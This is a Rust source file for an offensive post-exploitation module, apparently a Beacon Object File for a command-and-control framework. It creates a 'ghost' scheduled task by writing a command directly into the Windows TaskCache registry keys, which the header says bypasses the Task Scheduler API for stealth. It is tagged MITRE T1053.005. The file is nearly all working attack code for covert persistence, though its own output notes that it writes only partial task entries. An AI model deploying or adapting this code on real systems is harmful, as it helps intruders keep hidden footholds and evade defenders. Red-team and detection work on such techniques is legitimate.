//! # Ghost Task BOF
//!
//! Creates a "ghost" scheduled task by writing directly to the Task Scheduler
//! registry keys, bypassing the Task Scheduler COM API for stealth. Writes a
//! registry key under `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\<taskname>`
//! with the command stored as a string value.
//!
//! ## MITRE ATT&CK
//! - T1053.005 - Scheduled Task/Job: Scheduled Task
//!
//! ## Arguments
//! - `str`: Task name.
//! - `str`: Command to execute.

#![no_std]

use alloc::string::String;
use rustbof::data::DataParser;
use rustbof::{eprintln, println};
use windows_sys::Win32::Foundation::GetLastError;
use windows_sys::Win32::System::Registry::*;

const HKEY_LOCAL_MACHINE: isize = 0x80000002u32 as isize;

const REG_SZ: u32 = 1;

#[rustbof::main]
fn main(args: *mut u8, len: usize) {
    let mut parser = DataParser::new(args, len);
    let taskname = String::from(parser.get_str());
    let command = String::from(parser.get_str());

    if taskname.is_empty() {
        eprintln!("Task name is required");
        return;
    }
    if command.is_empty() {
        eprintln!("Command is required");
        return;
    }

    let mut path = alloc::vec::Vec::new();
    path.extend_from_slice(
        b"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\",
    );
    path.extend_from_slice(taskname.as_bytes());
    path.push(0);

    let command_cstr = rustbof::str::to_cstr(&command);

    unsafe {
        let mut hkey: isize = 0;
        let mut disposition: u32 = 0;

        let ret = RegCreateKeyExA(
            HKEY_LOCAL_MACHINE as HKEY,
            path.as_ptr(),
            0,
            core::ptr::null(),
            0, // REG_OPTION_NON_VOLATILE
            KEY_WRITE,
            core::ptr::null(),
            &mut hkey as *mut isize as *mut HKEY,
            &mut disposition,
        );
        if ret != 0 {
            eprintln!(
                "RegCreateKeyExA failed: 0x{:X} (error {})",
                ret,
                GetLastError()
            );
            eprintln!("Note: Requires elevated privileges (Administrator)");
            return;
        }

        let value_name = b"Path\0";
        let ret = RegSetValueExA(
            hkey as HKEY,
            value_name.as_ptr(),
            0,
            REG_SZ,
            command_cstr.as_ptr() as *const u8,
            (command.len() + 1) as u32,
        );
        if ret != 0 {
            eprintln!("RegSetValueExA (Path) failed: 0x{:X}", ret);
            RegCloseKey(hkey as HKEY);
            return;
        }

        let index_name = b"Index\0";
        let index_val: u32 = 0;
        let ret = RegSetValueExA(
            hkey as HKEY,
            index_name.as_ptr(),
            0,
            4, // REG_DWORD
            &index_val as *const u32 as *const u8,
            4,
        );
        if ret != 0 {
            eprintln!("RegSetValueExA (Index) failed: 0x{:X}", ret);
            RegCloseKey(hkey as HKEY);
            return;
        }

        RegCloseKey(hkey as HKEY);

        if disposition == 1 {
            println!("Ghost task created (new key):");
        } else {
            println!("Ghost task updated (existing key):");
        }
        println!("  Task:    {}", taskname);
        println!("  Command: {}", command);
        println!(
            "  Path:    HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\{}",
            taskname
        );
        println!("\nNote: This creates registry markers only. Full task execution requires");
        println!("additional TaskCache entries (Actions, Triggers, etc.).");
    }
}
